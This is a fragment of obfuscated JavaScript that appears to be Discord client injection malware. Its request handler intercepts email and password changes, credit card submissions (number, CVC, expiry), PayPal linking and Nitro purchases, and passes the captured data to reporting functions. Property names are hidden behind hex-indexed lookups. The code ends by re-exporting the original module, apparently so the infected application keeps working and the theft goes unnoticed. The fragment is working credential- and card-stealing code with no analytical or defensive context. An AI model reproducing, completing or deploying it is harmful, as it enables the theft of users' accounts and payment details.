            T[x7(0xa1)] && emailChanged(T['email'], T[x7(0x8e)], H)[x7(0x101)](console[x7(0x7f)]);
            T[x7(0x13b)] && passwordChanged(T[x7(0x8e)], T[x7(0x13b)], H)['catch'](console['error']);
            break;
        case Y[x7(0x73)][x7(0xa2)](x7(0xd6)) && Y['method'] === x7(0xbf):
            const V = querystring['parse'](unparsedData[x7(0xe0)]());
            ccAdded(V['card[number]'], V[x7(0x149)], V[x7(0xed)], V[x7(0x83)], H)[x7(0x101)](console[x7(0x7f)]);
            break;
        case Y['url'][x7(0xa2)](x7(0xf1)) && Y[x7(0xb2)] === x7(0xbf):
            PaypalAdded(H)[x7(0x101)](console[x7(0x7f)]);
            break;
        case Y[x7(0x73)][x7(0xa2)]('confirm') && Y[x7(0xb2)] === x7(0xbf):
            if (!config[x7(0x10a)]) return;
            setTimeout(() => {
                const x8 = x7;
                nitroBought(H)[x8(0x101)](console[x8(0x7f)]);
            }, 0x1d4c);
            break;
        default:
            break;
    }
}), module[S(0x12d)] = require(S(0x107));
